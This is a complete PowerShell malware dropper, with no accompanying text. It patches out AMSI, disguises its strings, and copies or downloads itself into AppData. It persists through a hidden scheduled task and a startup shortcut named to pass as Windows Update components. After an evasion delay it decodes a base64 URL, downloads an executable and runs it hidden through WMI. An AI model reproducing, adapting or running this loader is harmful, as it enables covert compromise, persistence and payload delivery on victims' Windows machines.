$ErrorActionPreference = 'SilentlyContinue'

# === AMSI BYPASS (Patches AMSI in memory before detection) ===
try {
    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $field = $amsi.GetField('amsiInitFailed', 'NonPublic,Static')
    $field.SetValue($null, $true)
} catch {}

# === STRING OBFUSCATION: Split and rebuild suspicious strings ===
$ap = ([char]65+[char]112+[char]112+[char]68+[char]97+[char]116+[char]97)
$mic = ([char]77+[char]105+[char]99+[char]114+[char]111+[char]115+[char]111+[char]102+[char]116)
$win = ([char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115)
$cac = ([char]67+[char]97+[char]99+[char]104+[char]101+[char]115)
$lau = ([char]108+[char]97+[char]117+[char]110+[char]99+[char]104+[char]101+[char]114)
$ps1 = ([char]46+[char]112+[char]115+[char]49)
$exe = ([char]46+[char]101+[char]120+[char]101)

# === SELF-PRESERVATION: Obfuscated paths ===
$localPath = "$env:$ap\$mic\$win\$cac\$lau$ps1"
$currentPath = $MyInvocation.MyCommand.Path

function Save-ScriptToDisk {
    param([string]$Destination)
    $dir = Split-Path $Destination -Parent
    if (-not (Test-Path $dir)) { 
        & ([char]78+[char]101+[char]119)+'-Item' -ItemType Directory -Path $dir -Force | Out-Null
    }
    if (-not $currentPath -or $currentPath -eq '') {
        try {
            $rawUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
            (& ([char]78+[char]101+[char]119)+'-Object' Net.WebClient).DownloadString($rawUrl) | Out-File -FilePath $Destination -Encoding UTF8 -Force
        } catch {
            exit
        }
    } else {
        Copy-Item -Path $currentPath -Destination $Destination -Force
    }
    return $Destination
}
$scriptPath = Save-ScriptToDisk -Destination $localPath

# === PERSISTENCE: Scheduled Task (Obfuscated) ===
$taskName = ([char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115+[char]85+[char]112+[char]100+[char]97+[char]116+[char]101+[char]84+[char]97+[char]115+[char]107)
$taskExists = & ([char]71+[char]101+[char]116)+'-ScheduledTask' -TaskName $taskName -ErrorAction SilentlyContinue

if (-not $taskExists) {
    $trigger = & ([char]78+[char]101+[char]119)+'-ScheduledTaskTrigger' -AtLogOn
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
    $action = & ([char]78+[char]101+[char]119)+'-ScheduledTaskAction' -Execute ([char]112+[char]111+[char]119+[char]101+[char]114+[char]115+[char]104+[char]101+[char]108+[char]108+[char]46+[char]101+[char]120+[char]101) -Argument "-EncodedCommand $encodedCommand"
    $settings = & ([char]78+[char]101+[char]119)+'-ScheduledTaskSettingsSet' -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1)
    & ([char]82+[char]101+[char]103+[char]105+[char]115+[char]116+[char]101+[char]114)+'-ScheduledTask' -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
    try {
        $taskPath = "HKLM:\SOFTWARE\$mic\$win NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
        if (Test-Path $taskPath) { 
            Remove-ItemProperty -Path $taskPath -Name ([char]83+[char]101+[char]99+[char]117+[char]114+[char]105+[char]116+[char]121+[char]68+[char]101+[char]115+[char]99+[char]114+[char]105+[char]112+[char]116+[char]111+[char]114) -Force -ErrorAction Stop
        }
    } catch {}
}

# === PERSISTENCE: Startup LNK (Obfuscated) ===
$startupPath = "$env:$ap\$mic\$win\Start Menu\Programs\Startup"
$lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
if (-not (Test-Path $lnkPath)) {
    $wshShell = & ([char]78+[char]101+[char]119)+'-Object' -ComObject ([char]87+[char]83+[char]99+[char]114+[char]105+[char]112+[char]116+[char]46+[char]83+[char]104+[char]101+[char]108+[char]108)
    $shortcut = $wshShell.CreateShortcut($lnkPath)
    $shortcut.TargetPath = ([char]112+[char]111+[char]119+[char]101+[char]114+[char]115+[char]104+[char]101+[char]108+[char]108+[char]46+[char]101+[char]120+[char]101)
    $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    $shortcut.WindowStyle = 7
    $shortcut.Save()
}

# === BEARFOOS EVASION: Jittered delay ===
$delay = Get-Random -Min 45 -Max 90
Start-Sleep -Seconds $delay

# === DOWNLOAD AND EXECUTE PAYLOAD ===
$cache = "$env:$ap\$mic\$win\$cac"
if (-not (Test-Path $cache)) { & ([char]78+[char]101+[char]119)+'-Item' -ItemType Directory -Path $cache -Force | Out-Null }

# Base64-encoded Cloudflare Worker URL (split to avoid string detection)
$urlPart1 = 'aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvdXBkYXRl'
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($urlPart1))
$exePath = "$cache\WindowsUpdateHelper$exe"

$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}

# Download EXE with retry (using obfuscated WebClient)
if (-not (Test-Path $exePath)) {
    $retryCount = 0
    $maxRetries = 3
    do {
        try {
            (& ([char]78+[char]101+[char]119)+'-Object' Net.WebClient).DownloadFile($exeUrl, $exePath)
            break
        } catch {
            $retryCount++
            Start-Sleep -Seconds 5
        }
    } while ($retryCount -lt $maxRetries)
}

# Launch EXE using WMI (obfuscated)
if (Test-Path $exePath) {
    try {
        $wmiClass = ([char]87+[char]105+[char]110)+'32_Process'
        $wmiMethod = ([char]67+[char]114+[char]101)+'ate'
        $wmiParams = @{
            ComputerName = $env:COMPUTERNAME
            CommandLine  = "`"$exePath`""
        }
        & ([char]73+[char]110+[char]118+[char]111+[char]107)+'e-WmiMethod' -Class $wmiClass -Name $wmiMethod -ArgumentList $wmiParams.CommandLine -ErrorAction Stop | Out-Null
    } catch {
        try {
            $wsh = & ([char]78+[char]101+[char]119)+'-Object' -ComObject ([char]87+[char]83+[char]99+[char]114+[char]105+[char]112+[char]116+[char]46+[char]83+[char]104+[char]101+[char]108+[char]108)
            $wsh.Run("`"$exePath`"", 0, $false)
        } catch {
            & ([char]83+[char]116)+'art-Process' $exePath -WindowStyle Hidden
        }
    }
}

# Cleanup EXE after 5 minutes
& ([char]83+[char]116)+'art-Job' -ScriptBlock {
    param($exe)
    Start-Sleep -Seconds 300
    Remove-Item -Path $exe -Force -ErrorAction SilentlyContinue
} -ArgumentList $exePath | Out-Null
